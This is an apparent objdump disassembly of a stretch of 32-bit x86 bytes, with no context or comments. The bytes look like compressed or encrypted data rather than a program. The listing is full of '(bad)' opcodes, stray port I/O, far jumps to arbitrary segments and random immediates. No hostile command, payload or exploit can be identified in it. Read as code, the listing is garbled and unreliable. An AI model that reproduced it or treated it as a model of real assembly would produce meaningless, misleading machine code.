  417de3:	(bad)  
  417de4:	jecxz  0x417d85
  417de6:	clc    
  417de7:	jo     0x417da5
  417de9:	imul   eax,eax,0x44
  417dec:	(bad)  [ebx+0x71]
  417def:	aam    0x69
  417df1:	jmp    0xc00:0x54b2c22d
  417df8:	ret    
  417df9:	out    dx,al
  417dfa:	push   edi
  417dfb:	das    
  417dfc:	pop    es
  417dfd:	mov    edi,0xb98fd555
  417e02:	fyl2xp1 
  417e04:	sbb    ah,ch
  417e06:	nop
  417e07:	push   es
  417e08:	stc    
  417e09:	mov    cl,0x86
  417e0b:	neg    BYTE PTR [ebx-0x727e27ae]
  417e11:	stos   BYTE PTR es:[edi],al
  417e12:	sbb    DWORD PTR [ebx],edi
  417e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e15:	rcr    ch,cl
  417e17:	sub    ebp,edi
  417e19:	sbb    al,0xec
  417e1b:	sbb    esi,ecx
  417e1d:	jo     0x417db0
  417e1f:	fld    TBYTE PTR [edx+0x13]
  417e22:	imul   eax,DWORD PTR [ecx+edx*2],0xffffffde
  417e26:	lock xor al,BYTE PTR [edi-0x18]
  417e2a:	std    
  417e2b:	xor    al,0x7b
  417e2d:	mov    dh,0x97
  417e2f:	jo     0x417e82
  417e31:	es fs imul esp,ebp,0x14
  417e36:	and    esp,eax
  417e38:	sar    BYTE PTR [ebp-0x5acc2f73],cl
  417e3e:	or     BYTE PTR [ecx+0x328d5343],bl
  417e44:	call   FWORD PTR [edx+0x4e]
  417e47:	pop    ecx
  417e48:	neg    dh
  417e4a:	(bad)  
  417e4b:	push   esi
  417e4c:	mov    ah,0x62
  417e4e:	dec    ecx
  417e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e50:	rcl    DWORD PTR [edx],cl
  417e52:	jecxz  0x417e6d
  417e54:	test   eax,eax
  417e56:	mov    ds:0x171435f2,al
  417e5b:	adc    esp,DWORD PTR [eax-0x64]
  417e5e:	cwde   
  417e5f:	bound  ebp,QWORD PTR [esi]
  417e61:	mov    bh,0x15
  417e63:	mov    dl,0xba
  417e65:	loop   0x417e26
  417e67:	icebp  
  417e68:	dec    esp
  417e69:	aam    0x16
  417e6b:	in     eax,0x5e
  417e6d:	mov    edx,?
  417e6f:	cmp    ebx,DWORD PTR ds:0x4d8d14bb
  417e75:	inc    ebp
  417e76:	div    DWORD PTR [ebp-0x35d7a989]
  417e7c:	mov    esi,0x67faf55b
  417e81:	add    ecx,DWORD PTR [ecx+0x50]
  417e84:	xor    al,0xf9
  417e86:	fstp   TBYTE PTR [edx]
  417e88:	jp     0x417e46
  417e8a:	and    eax,0x10e7a486
  417e8f:	(bad)  
  417e90:	cwde   
  417e91:	pop    eax
  417e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e93:	ret    
  417e94:	push   ds
  417e95:	mov    bl,0x9
  417e97:	(bad)  
  417e98:	popa   
  417e99:	ins    DWORD PTR es:[edi],dx
  417e9a:	mov    dl,0x7c
  417e9c:	or     BYTE PTR [ecx+ebp*4],dh
  417e9f:	push   ebp
  417ea0:	aad    0x59
  417ea2:	scas   al,BYTE PTR es:[edi]
  417ea3:	sbb    eax,0x5da9ace3
  417ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea9:	sar    DWORD PTR [edi-0x7c],cl
  417eac:	xchg   ebp,eax
  417ead:	enter  0x792d,0xa2
  417eb1:	push   edi
  417eb2:	mov    WORD PTR [esi],gs
  417eb4:	push   esi
  417eb5:	(bad)  
  417eb6:	push   0xf9228f12
  417ebb:	lods   eax,DWORD PTR ds:[esi]
  417ebc:	push   edx
  417ebd:	out    dx,al
  417ebe:	push   0x13e11644
  417ec3:	in     al,0xf4
  417ec5:	sub    al,0x4d
  417ec7:	retf   0xfd39
  417eca:	adc    al,0x34
  417ecc:	call   0x7acd3a65
  417ed1:	and    eax,edx
  417ed3:	mov    ch,0x21
  417ed5:	mov    al,0xc2
  417ed7:	fild   QWORD PTR [edx]
  417ed9:	xchg   esi,eax
  417eda:	xor    cl,ah
  417edc:	out    0x61,al
  417ede:	and    eax,0xdf9a3d2a
  417ee3:	add    al,BYTE PTR [edx]
  417ee5:	enter  0xd9c6,0xdc
  417ee9:	or     DWORD PTR [edi],eax
  417eeb:	xchg   ebx,eax
  417eec:	push   0x68
  417eee:	add    al,BYTE PTR [esp+ecx*8]
  417ef1:	pop    eax
  417ef2:	or     al,0x84
  417ef4:	addr16 sti 
  417ef6:	mov    al,ds:0x4f5c31c4
  417efb:	call   0x7e80:0x60382492
  417f02:	(bad)  
  417f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f04:	jae    0x417ef9
  417f06:	dec    edx
  417f07:	or     edx,DWORD PTR [ecx+0x6996ebfd]
  417f0d:	repnz sbb al,0xb0
  417f10:	dec    eax
  417f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f12:	mov    DWORD PTR [ebp+0x66],edx
  417f15:	mov    DWORD PTR [ecx],esi
  417f17:	fmul   QWORD PTR [ebx-0x51]
  417f1a:	(bad)  
  417f1c:	mov    ebp,0x4f0c3a46
  417f21:	daa    
  417f22:	popf   
  417f23:	sbb    DWORD PTR [ebx+0x6fe451a7],ebx
  417f29:	ds mov dh,BYTE PTR es:[esi+0x20]
  417f2e:	ffreep st(7)
  417f30:	inc    edx
  417f31:	xor    BYTE PTR [ebp-0xa68d91e],ah
  417f37:	and    ah,ch
  417f39:	enter  0xd638,0xc5
  417f3d:	rcr    BYTE PTR [esi+0x53],cl
  417f40:	or     DWORD PTR [ebp-0x73],0xe7873209
  417f47:	pop    ebx
  417f48:	aas    
  417f49:	test   eax,0xa0d1c2a1
  417f4e:	retf   0xa7cd
  417f51:	pop    ss
  417f52:	ss data16 in al,dx
  417f55:	or     BYTE PTR [esi-0x6d],0x8
  417f59:	push   esp
  417f5a:	ret    
  417f5b:	fstp   QWORD PTR [esi+0xf]
  417f5e:	cs emms 
  417f61:	bound  edi,QWORD PTR [ebx]
  417f63:	push   ebx
  417f64:	inc    edx
  417f65:	mov    esp,0x54e7661d
  417f6a:	sar    BYTE PTR [edx+eax*1+0x55],0x59
  417f6f:	mov    ds:0x6eb1072f,eax
  417f74:	dec    ebx
  417f75:	aam    0x2d
  417f77:	shr    dh,1
  417f79:	adc    al,0xe8
  417f7b:	mov    ebp,0xb144746
  417f80:	fcomp  DWORD PTR [eax-0x139a3a7e]
  417f86:	xchg   esp,eax
  417f87:	les    ecx,FWORD PTR [ebx+0x6c]
  417f8a:	dec    edi
  417f8b:	inc    esi
  417f8c:	paddusw mm6,QWORD PTR [edi+eiz*1+0x49]
  417f91:	jno    0x417f28
  417f93:	pop    eax
  417f94:	dec    eax
  417f95:	dec    ebx
  417f96:	mov    ah,0x1a
  417f98:	dec    edi
  417f99:	outs   dx,BYTE PTR ds:[esi]
  417f9a:	(bad)  
  417f9c:	push   0xe9b4a4fe
  417fa1:	nop
  417fa2:	dec    ebx
  417fa3:	test   eax,0x4f55747
  417fa8:	(bad)  
  417fa9:	cmp    DWORD PTR [eax+edx*8-0x60472d],edx
  417fb0:	pop    ss
  417fb1:	outs   dx,BYTE PTR ds:[esi]
  417fb2:	push   0x80ea9276
  417fb7:	out    dx,eax
  417fb8:	push   es
  417fb9:	jne    0x418032
  417fbb:	mov    eax,DWORD PTR [esp+ebp*4]
  417fbe:	push   eax
  417fbf:	lds    ebp,FWORD PTR [ebp+0x68]
  417fc2:	and    DWORD PTR [ebp+0x216f22fe],ebx
  417fc8:	popf   
  417fc9:	mov    ds:0x4a3f6657,al
  417fce:	addr16 push ebx
  417fd0:	inc    ecx
  417fd1:	dec    eax
  417fd2:	jl     0x417fe3
  417fd4:	adc    al,0x59
  417fd6:	mov    eax,ds:0xd77a604e
  417fdb:	inc    esp
  417fdc:	ins    DWORD PTR es:[edi],dx
  417fdd:	loope  0x417f9d
  417fdf:	mov    ah,0x1c
  417fe1:	or     eax,0xfcd0df6
  417fe6:	cwde   
  417fe7:	mov    ds:0x8e929b9d,eax
  417fec:	ja     0x418047
  417fee:	jno    0x417fa1
  417ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ff1:	fwait
  417ff2:	ja     0x417faf
  417ff4:	scas   al,BYTE PTR es:[edi]
  417ff5:	add    edx,DWORD PTR [ecx+0xa882bab]
  417ffb:	mov    esp,0xe11b1470
  418000:	dec    ebx
  418001:	add    ebp,DWORD PTR [ebx]
  418003:	mov    esp,fs
  418005:	pop    es
  418006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418007:	shr    DWORD PTR [eax-0x6a],cl
  41800a:	aaa    
  41800b:	and    al,0x1b
  41800d:	sub    al,0x5d
  41800f:	stos   DWORD PTR es:[edi],eax
  418010:	fcomp  DWORD PTR [ebp-0x32]
  418013:	mov    dh,0xa4
  418015:	gs push ebp
  418017:	push   DWORD PTR [ebx]
  418019:	xchg   edi,eax
  41801a:	fidiv  WORD PTR [bx+si]
  41801d:	pop    esi
  41801e:	or     DWORD PTR [esi],0xffffffa0
  418021:	adc    al,0x88
  418023:	push   0x25587bf4
  418028:	inc    edx
  418029:	rcr    BYTE PTR [ecx+0xc],0x7a
  41802d:	aad    0xcb
  41802f:	pop    esi
  418030:	mov    cl,0x33
  418032:	test   DWORD PTR [edi-0x1f],eax
  418035:	dec    si
  418037:	mov    bh,0xb7
  418039:	pop    esp
  41803a:	into   
  41803b:	and    ch,cl
  41803d:	sub    DWORD PTR [edi+0x3e],ebx
  418040:	push   ss
  418041:	or     eax,0x58382b0d
  418046:	pop    edi
  418047:	jge    0x418077
  418049:	inc    esp
  41804a:	pushf  
  41804b:	sar    DWORD PTR [ebp+0x6],0x39
  41804f:	dec    esp
  418050:	aaa    
  418051:	scas   al,BYTE PTR es:[edi]
  418052:	and    ebp,DWORD PTR [ebp+0x3f53211]
  418058:	sbb    al,0x33
  41805a:	in     al,dx
  41805b:	les    ebp,FWORD PTR [ebx+0x52]
  41805e:	add    esi,DWORD PTR [ebx]
  418060:	mov    cl,0x3d
  418062:	lds    edx,FWORD PTR [ebx+0x53]
  418065:	inc    ecx
  418066:	imul   eax,DWORD PTR [eax],0x463713d2
  41806c:	mov    ecx,0xb72298b1
  418071:	(bad)  
  418072:	pop    edx
  418073:	les    ebp,FWORD PTR [edi-0x7d]
  418076:	sbb    BYTE PTR [ecx-0x38],0xbf
  41807a:	in     eax,0x9c
  41807c:	sbb    eax,0x2169b86
  418081:	mov    edi,eax
  418083:	or     ebp,edi
  418085:	push   ebp
  418086:	add    BYTE PTR [edi],bh
  418088:	test   eax,0xabae3c46
  41808d:	xlat   BYTE PTR ds:[ebx]
  41808e:	add    eax,0x76eff18c
  418093:	and    edi,DWORD PTR [esi-0x7629487c]
  418099:	sub    DWORD PTR [edx],0x57815422
  41809f:	clc    
  4180a0:	mov    DWORD PTR [edi+0xbd8a538],eax
  4180a6:	sar    cl,0x5f
  4180a9:	pop    esi
  4180aa:	std    
  4180ab:	cmp    dh,BYTE PTR [edx]
  4180ad:	xchg   edx,eax
  4180ae:	or     bh,ch
  4180b0:	mov    dh,0x9e
  4180b2:	jne    0x4180c7
  4180b4:	aad    0x6a
  4180b6:	pop    ds
  4180b7:	loope  0x41805a
  4180b9:	add    al,0x9b
  4180bb:	xchg   ebx,eax
  4180bc:	in     al,dx
  4180bd:	inc    esp
  4180be:	add    edx,eax
  4180c0:	mov    dh,0x39
  4180c2:	sbb    edi,ebp
  4180c4:	mov    dl,0x11
  4180c6:	jg     0x4180b6
  4180c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c9:	call   0xcf94:0x79fa4def
  4180d0:	and    DWORD PTR ss:[edi+0x8],ebp
  4180d4:	and    ebx,ecx
  4180d6:	xor    eax,0xd4c6f285
  4180db:	xor    BYTE PTR [edx-0x7c],ch
  4180de:	mov    ebx,0x10e9d779
  4180e3:	pop    es
  4180e4:	or     DWORD PTR [eax-0x64],ebp
  4180e7:	push   ebp
  4180e8:	fwait
  4180e9:	sti    
  4180ea:	pop    ds
  4180eb:	aas    
  4180ec:	push   ebx
  4180ed:	adc    eax,0xa817d72a
  4180f2:	jnp    0x418138
  4180f4:	inc    ebx
  4180f5:	pop    esi
  4180f6:	sub    eax,DWORD PTR [ebx-0x44]
  4180f9:	ret    0x418a
  4180fc:	and    BYTE PTR ds:0x772274ec,cl
  418102:	xchg   DWORD PTR [edx],eax
  418104:	mov    al,BYTE PTR [edi]
  418106:	lds    ecx,FWORD PTR [edx-0x79]
  418109:	js     0x41809f
  41810b:	push   ebx
  41810c:	es jl  0x418146
  41810f:	cmp    DWORD PTR [edx],ebp
  418111:	adc    esp,DWORD PTR [ecx-0x38d31749]
  418117:	xlat   BYTE PTR ds:[ebx]
  418118:	mov    al,ds:0x44808b06
  41811d:	push   esi
  41811e:	mov    ah,BYTE PTR [eax+0x73f84cf8]
  418124:	ret    0xe38d
  418127:	jno    0x41814f
  418129:	(bad)  
  41812a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41812b:	xchg   esp,eax
  41812c:	ins    BYTE PTR es:[edi],dx
  41812d:	dec    ebp
  41812e:	adc    edx,edx
  418130:	js     0x41812e
  418132:	sbb    eax,0xeca38e22
  418137:	pop    ss
  418138:	outs   dx,DWORD PTR ds:[esi]
  418139:	mov    ch,0xb1
  41813b:	scas   eax,DWORD PTR es:[edi]
  41813c:	jl     0x4181b3
  41813e:	aad    0x5e
  418140:	call   0x384b:0xedc37e41
  418147:	sub    bh,bh
  418149:	and    al,0x7
  41814b:	shl    BYTE PTR [edx],0x25
  41814e:	add    DWORD PTR [bx+di+0x516],ecx
  418153:	mov    al,cl
  418155:	into   
  418156:	aaa    
  418157:	xchg   esp,eax
  418158:	iret   
  418159:	push   0xffffff90
  41815b:	and    BYTE PTR [esi+0x65ad129f],dh
  418161:	sahf   
  418162:	es mov eax,0xd22ff382
  418168:	cmp    bh,BYTE PTR [ebp+0x5a2c3be8]
  41816e:	lahf   
  41816f:	rcr    BYTE PTR [eax-0x2f8bb861],0x5d
  418176:	out    dx,eax
  418177:	es cmc 
  418179:	mov    ds:0x45c1d5e2,eax
  41817e:	dec    edx
  41817f:	add    eax,0x570981de
  418184:	nop
  418185:	inc    ebx
  418186:	mov    ebx,0xf6deef05
  41818b:	xchg   ebx,eax
  41818c:	xor    al,0xc5
  41818e:	or     eax,0x78961889
  418193:	cs ja  0x41816c
  418196:	adc    al,0x38
  418198:	(bad)  
  418199:	xor    DWORD PTR [esi],eax
  41819b:	or     eax,0x75d01f71
  4181a0:	add    dl,ch
  4181a2:	mov    DWORD PTR [eax+edx*1],ebp
  4181a5:	imul   edi,ebp,0xffffffa4
  4181a8:	popa   
  4181a9:	sbb    al,0x10
  4181ab:	sub    DWORD PTR [eax],ecx
  4181ad:	es push 0x21006095
  4181b3:	cmp    cl,al
  4181b5:	mov    al,ds:0x2901d67e
  4181ba:	push   ds
  4181bb:	dec    edi
  4181bc:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4181be:	sahf   
  4181bf:	call   0x1f2d83ae
  4181c4:	inc    edi
  4181c5:	adc    esp,DWORD PTR [ebx+0x2fa7a26a]
  4181cb:	sbb    al,0xc1
  4181cd:	adc    eax,0x3e598991
  4181d2:	mov    cl,0x4d
  4181d4:	fnstsw WORD PTR [ebx]
  4181d6:	(bad)  
  4181d7:	out    dx,al
  4181d8:	dec    ecx
  4181d9:	mov    ebp,0x29625c03
  4181de:	retf   0x9501
  4181e1:	mov    ecx,0xff717d26
  4181e6:	push   0x3a3c7fd2
  4181eb:	loopne 0x4181d9
  4181ed:	les    esp,FWORD PTR [edi]
  4181ef:	mov    ebx,0xaa8c3268
  4181f4:	scas   al,BYTE PTR es:[edi]
  4181f5:	add    DWORD PTR ds:[edi],0xfc7f7b36
  4181fc:	in     eax,0xb4
  4181fe:	sbb    DWORD PTR [ebx],0xffffff8a
  418201:	repnz imul edx,DWORD PTR [ecx+0x3dce4493],0xffffffd4
  418209:	dec    esi
  41820a:	les    ax,DWORD PTR [eax-0x46]
  41820e:	pop    edi
  41820f:	mov    ss,WORD PTR [edi]
  418211:	daa    
  418212:	jb     0x418239
  418214:	xchg   ebx,eax
  418215:	cmp    al,0x3b
  418217:	pop    edx
  418218:	xchg   DWORD PTR [ecx+eax*4-0x1fb5ab1d],esp
  41821f:	mov    esp,0x3c952e0e
  418224:	xor    DWORD PTR [ebp-0x42],esp
  418227:	outs   dx,BYTE PTR ds:[esi]
  418228:	push   es
  418229:	fistp  WORD PTR [esi]
  41822b:	jb     0x418231
  41822d:	cld    
  41822e:	adc    eax,0x56248817
  418233:	xor    edi,edi
  418235:	sete   BYTE PTR [ecx]
  418238:	shl    ch,1
  41823a:	add    BYTE PTR [ecx+0x6f],bh
  41823d:	call   0xfcef2561
  418242:	cmp    eax,0xeb3650d9
  418247:	add    BYTE PTR [ebx-0x7f],ch
  41824a:	(bad)  
  41824c:	and    al,bh
  41824e:	push   esi
  41824f:	loopne 0x4182ac
  418251:	scas   eax,DWORD PTR es:[edi]
  418252:	stc    
  418253:	and    dh,BYTE PTR [esi+edi*8]
  418256:	aas    
  418257:	int3   
  418258:	and    eax,0x6c1542ef
  41825d:	xor    eax,0xd93aa35
  418262:	adc    eax,0x5cba2b2a
  418267:	outs   dx,DWORD PTR ds:[esi]
  418268:	cmp    BYTE PTR [ecx-0x2b90ec68],ah
  41826e:	leave  
  41826f:	push   esp
  418270:	enter  0x7589,0xa1
  418274:	(bad)  
  418275:	ins    BYTE PTR es:[edi],dx
  418276:	inc    dl
  418278:	dec    ebp
  418279:	ins    DWORD PTR es:[edi],dx
  41827a:	arpl   sp,bp
  41827c:	fcomp  st(6)
  41827e:	int    0x4e
  418280:	loopne 0x418219
  418282:	ja     0x418284
  418284:	neg    BYTE PTR [ecx+0x1932e005]
  41828a:	sub    ebx,eax
  41828c:	push   0x1f760567
  418291:	js     0x41830d
  418293:	outs   dx,DWORD PTR ds:[esi]
  418294:	inc    edi
  418295:	xchg   DWORD PTR [edx+eax*2+0x5473f164],ebx
  41829c:	retf   0xbfa3
  41829f:	out    dx,al
  4182a0:	sbb    DWORD PTR [ebp+0x66],edx
  4182a3:	lahf   
  4182a4:	ret    0x7588
  4182a7:	dec    edx
  4182a8:	jae    0x418318
  4182aa:	sbb    DWORD PTR [ebp+0x6a],0xffffffd5
  4182ae:	cmp    eax,DWORD PTR [esi]
  4182b0:	dec    ebp
  4182b1:	adc    DWORD PTR [ecx],ecx
  4182b3:	out    0x1f,eax
  4182b5:	push   ebx
  4182b6:	push   0x18e9945
  4182bb:	mov    esi,0x89b7c674
  4182c0:	mov    ds:0xbbf0b852,eax
  4182c5:	imul   eax,edi,0xd
  4182c8:	retf   0xd0b0
  4182cb:	scas   al,BYTE PTR es:[edi]
  4182cc:	nop
  4182cd:	xchg   ecx,eax
  4182ce:	adc    BYTE PTR [edx-0x5ca2b22a],dh
  4182d4:	or     DWORD PTR [ebp-0x5],edx
  4182d7:	mov    ch,al
  4182d9:	pushf  
  4182da:	mov    esp,0x5fcac31f
  4182df:	pop    ds
  4182e0:	fwait
  4182e1:	arpl   WORD PTR [esi-0x784e89b2],cx
  4182e7:	imul   esp,DWORD PTR ds:0x982f55d3,0xffffffd1
  4182ee:	push   DWORD PTR [esi+0x5f]
  4182f1:	test   eax,0xb5a30846
  4182f6:	dec    edx
  4182f7:	loopne 0x4182e5
  4182f9:	clc    
  4182fa:	sbb    al,0x74
  4182fc:	loop   0x4182a8
  4182fe:	xor    ecx,DWORD PTR [ecx-0x1a]
  418301:	das    
  418302:	test   al,0xff
  418304:	and    al,0xe
  418306:	imul   eax,DWORD PTR [ecx+edi*4],0xffffffb2
  41830a:	add    BYTE PTR [eax],0xc9
  41830d:	and    eax,0xca5f86ee
  418312:	add    al,0x71
  418314:	jmp    0x7c8a:0x9e1d1257
  41831b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41831c:	aam    0xb8
  41831e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41831f:	sub    BYTE PTR [ecx-0x17],0x89
  418323:	stos   DWORD PTR es:[edi],eax
  418324:	and    al,0x33
  418326:	xchg   ebp,eax
  418327:	out    0x79,eax
  418329:	(bad)  
  41832a:	mov    esp,0x19922d3e
  41832f:	std    
  418330:	or     al,bh
  418332:	adc    cl,dh
  418334:	push   0x6601d5ff
  418339:	jbe    0x4182e5
  41833b:	imul   BYTE PTR [esi+0x1f]
  41833e:	popa   
  41833f:	out    0x30,al
  418341:	icebp  
  418342:	je     0x5f794043
  418348:	(bad)
  41834c:	sahf   
  41834d:	dec    edx
  41834e:	fild   QWORD PTR [ebp-0x42]
  418351:	xor    al,0x76
  418353:	pop    esp
  418354:	push   cs
  418355:	arpl   WORD PTR [eax-0x3dd58640],cx
  41835b:	adc    ch,cl
  41835d:	mov    dl,0xd8
  41835f:	mov    esi,0xf4a3027d
  418364:	push   es
  418365:	inc    eax
  418366:	stos   DWORD PTR es:[edi],eax
  418367:	sahf   
  418368:	push   ss
  418369:	daa    
  41836a:	aam    0xdc
  41836c:	fsub   DWORD PTR fs:[edx-0x6d]
  418370:	aad    0xd8
  418372:	mov    bh,0x5a
  418374:	jb     0x41838e
  418376:	sbb    ch,BYTE PTR [ecx]
  418378:	mov    ?,WORD PTR [edi-0x23]
  41837b:	sbb    BYTE PTR [edi-0x7c],ah
  41837e:	mov    al,0xd6
  418380:	push   eax
  418381:	retf   
  418382:	sahf   
  418383:	fistp  DWORD PTR [edi]
  418385:	xor    eax,0x74b40810
  41838a:	mov    al,BYTE PTR [ebp+eax*8+0x6901022b]
  418391:	add    al,0x5f
  418393:	neg    ah
  418395:	jg     0x4183ea
  418397:	pusha  
  418398:	dec    esp
  418399:	inc    ecx
  41839a:	pop    esp
  41839b:	adc    esp,esi
  41839d:	adc    cl,BYTE PTR [eax+0x48602fb7]
  4183a3:	gs dec ebp
  4183a5:	xor    ecx,0xffffffa9
  4183a8:	push   DWORD PTR [ecx-0x479d88f0]
  4183ae:	stos   BYTE PTR es:[edi],al
  4183af:	imul   edx,DWORD PTR [ebp-0x45],0x4f02d612
  4183b6:	cwde   
  4183b7:	aaa    
  4183b8:	mov    eax,ds:0x989cd5c4
  4183bd:	jne    0x41835f
  4183bf:	fs shl bh,1
  4183c2:	imul   ebp,DWORD PTR [ecx],0xd937903d
  4183c8:	dec    edi
  4183c9:	add    al,0x89
  4183cb:	mov    BYTE PTR ds:0x65c5292,ch
  4183d1:	sbb    BYTE PTR [ebp-0x2e],dh
  4183d4:	xor    eax,0x7e7e0206
  4183d9:	fild   DWORD PTR [edx-0x58]
  4183dc:	fcomp  DWORD PTR [eax+0x39a27102]
  4183e2:	mov    ecx,0xd54613da
  4183e7:	xor    DWORD PTR [esi+eax*1-0x5ff56708],eax
  4183ee:	xchg   ebp,eax
  4183ef:	das    
  4183f0:	int3   
  4183f1:	adc    BYTE PTR ds:0xd20fbfa6,bl
  4183f7:	scas   eax,DWORD PTR es:[edi]
  4183f8:	cmp    esi,edx
  4183fa:	jg     0x4183f4
  4183fc:	xor    DWORD PTR [ecx+eiz*1-0x2b84498e],0x2f722cc9
  418407:	push   edx
  418408:	psubq  mm5,QWORD PTR [eax]
  41840b:	out    0x5a,eax
  41840d:	inc    edx
  41840e:	dec    eax
  41840f:	inc    BYTE PTR [ebx]
  418411:	mov    esi,0xe8641fc
  418416:	or     edi,ebx
  418418:	stc    
  418419:	cld    
  41841a:	push   0xffffff9b
  41841c:	xor    al,0x89
  41841e:	scas   al,BYTE PTR es:[edi]
  41841f:	mov    dh,0x24
  418421:	and    DWORD PTR ss:[edi],0xf74479d8
  418428:	shr    BYTE PTR [eax+0x4b],0x3f
  41842c:	push   ds
  41842d:	xchg   DWORD PTR [esi],ebx
  41842f:	cmp    eax,ecx
  418431:	xchg   edi,eax
  418432:	cld    
  418433:	and    esi,DWORD PTR [edx+0x27]
  418436:	test   esp,edx
  418438:	cld    
  418439:	dec    esp
  41843a:	cmp    DWORD PTR [ecx+0x739dea8c],0xffffff95
  418441:	jl     0x418401
  418443:	and    eax,0x6890c30a
  418448:	jmp    0x4184c6
  41844a:	fwait
  41844b:	mov    bh,0x65
  41844d:	push   cs
  41844e:	xlat   BYTE PTR ds:[ebx]
  41844f:	push   ss
  418450:	arpl   WORD PTR [ebp-0x7bdf5166],si
  418456:	(bad)  
  418457:	bound  esi,QWORD PTR [ebp-0xe]
  41845a:	and    BYTE PTR [eax-0x56b34fb9],cl
  418460:	jmp    0xbdd6:0x63cc398d
  418467:	or     al,0x8f
  418469:	adc    bh,BYTE PTR [ecx-0x7581d5ee]
  41846f:	cmp    BYTE PTR [ecx+0x22],ah
  418472:	add    bh,BYTE PTR [esi]
  418474:	fs stc 
  418476:	xor    esi,DWORD PTR [edi+eiz*8+0x31]
  41847a:	or     esp,DWORD PTR ds:0xfd707658
  418480:	nop
  418481:	jbe    0x4184dd
  418483:	push   edi
  418484:	fst    DWORD PTR [ecx+0x4ff5ddf5]
  41848a:	fisub  DWORD PTR [ebx-0x31213ca5]
  418490:	sub    cl,BYTE PTR [ecx]
  418492:	xor    DWORD PTR [esi+eiz*4-0x670b17f6],ecx
  418499:	xchg   ecx,eax
  41849a:	test   BYTE PTR [ecx+0x79ebed76],ah
  4184a0:	call   0x54a40d07
  4184a5:	std    
  4184a6:	lods   al,BYTE PTR ds:[esi]
  4184a7:	sub    eax,esp
  4184a9:	pop    ebp
  4184aa:	int3   
  4184ab:	mov    cl,0xc6
  4184ad:	pop    eax
  4184ae:	jmp    0x41851d
  4184b0:	jmp    0x41846e
  4184b2:	xchg   ecx,eax
  4184b3:	push   ss
  4184b4:	pusha  
  4184b5:	cmp    cl,BYTE PTR [esi+0x953c8f4]
  4184bb:	bound  edi,QWORD PTR [eax-0xc]
  4184be:	jnp    0x41851b
  4184c0:	jl     0x418442
  4184c2:	lahf   
  4184c3:	cwde   
  4184c4:	ins    BYTE PTR es:[edi],dx
  4184c5:	dec    esp
  4184c6:	(bad)  
  4184c7:	call   0x3205:0x61a61864
  4184ce:	(bad)
  4184d1:	jg     0x4184f0
  4184d3:	je     0x41846e
  4184d5:	pop    ds
  4184d6:	mov    edi,0x52922b
  4184db:	push   ds
  4184dc:	push   0x2e2b0013
  4184e1:	ss dec ecx
  4184e3:	mov    ecx,0xd316b085
  4184e8:	and    al,0x3c
  4184ea:	cs int 0x1a
  4184ed:	xchg   ebp,eax
  4184ee:	fadd   QWORD PTR [edx-0x10]
  4184f1:	adc    al,ah
  4184f3:	in     eax,0x59
  4184f5:	sub    al,0x3c
  4184f7:	aaa    
  4184f8:	pmaxub mm0,QWORD PTR [eax-0x4b38ef94]
  4184ff:	aaa    
  418500:	sub    ecx,DWORD PTR [esi]
  418502:	jmp    0x418583
  418504:	inc    ebp
  418505:	pop    edx
  418506:	mov    edx,0x6d48fc07
  41850b:	mov    ds:0x22f68225,eax
  418510:	mov    eax,ds:0x7dd59763
  418515:	dec    eax
  418516:	dec    ebp
  418517:	mov    ebx,0x3a3f0f31
  41851c:	cmp    BYTE PTR [ebx+edx*2+0x8],ch
  418520:	mov    bh,0xd8
  418522:	cmp    BYTE PTR [ecx],dh
  418524:	aam    0xd1
  418526:	xlat   BYTE PTR ds:[ebx]
  418527:	inc    edx
  418528:	jle    0x41856a
  41852a:	push   cs
  41852b:	or     DWORD PTR [esi+0x4d],0x63
  41852f:	not    BYTE PTR [ebp-0x37eee14a]
  418535:	jle    0x41854d
  418537:	jb     0x41857c
  418539:	shl    ebx,1
  41853b:	sbb    ah,al
  41853d:	xchg   edi,eax
  41853e:	out    0x1c,eax
  418540:	lock sub dh,BYTE PTR [ebx-0x63c7f899]
  418547:	xor    esp,DWORD PTR [edx+ecx*2]
  41854a:	cmp    eax,0xd8aa69c6
  41854f:	inc    edx
  418550:	ja     0x418511
  418552:	pop    es
  418553:	or     al,0x3d
  418555:	int    0x84
  418557:	adc    DWORD PTR [ebx+0x3025c6bc],esi
  41855d:	xchg   DWORD PTR [ebx],ecx
  41855f:	mov    ch,0xcf
  418561:	js     0x418548
  418563:	test   edi,ecx
  418565:	mov    dl,0x7f
  418567:	sbb    al,0x5f
  418569:	pushf  
  41856a:	fist   DWORD PTR [ebp-0x4f8f10d1]
  418570:	in     eax,dx
  418571:	fwait
  418572:	xor    dl,ah
  418574:	pop    ds
  418575:	cmp    BYTE PTR [ebx],dl
  418577:	das    
  418578:	dec    esp
  418579:	clc    
  41857a:	adc    eax,0x9373a5b9
  41857f:	sbb    ebx,esp
  418581:	inc    esp
  418582:	sub    bh,BYTE PTR [ebx+0x72058ee1]
  418588:	jecxz  0x418602
  41858a:	jbe    0x418582
  41858c:	out    0x5c,al
  41858e:	out    dx,eax
  41858f:	sub    BYTE PTR [edi-0x45340111],cl
  418595:	cmp    eax,0x15bfb2c6
  41859a:	jb     0x41857e
  41859c:	xchg   ecx,eax
  41859d:	xchg   edi,eax
  41859e:	cmc    
  41859f:	sbb    DWORD PTR [ebp+0x1b],esi
  4185a2:	jo     0x41853f
  4185a4:	clc    
  4185a5:	adc    eax,0x95ed2756
  4185aa:	and    eax,0x77258750
  4185af:	in     eax,0xa4
  4185b1:	mov    DWORD PTR [eax+0x3f016231],edi
  4185b7:	mov    edx,0x7aa1177d
  4185bc:	cmp    eax,0x3a9bb9fe
  4185c1:	push   esi
  4185c2:	imul   BYTE PTR [eax+edx*8]
  4185c5:	mov    eax,DWORD PTR [esi-0x63]
  4185c8:	popf   
  4185c9:	xlat   BYTE PTR ds:[ebx]
  4185ca:	js     0x418551
  4185cc:	inc    ebx
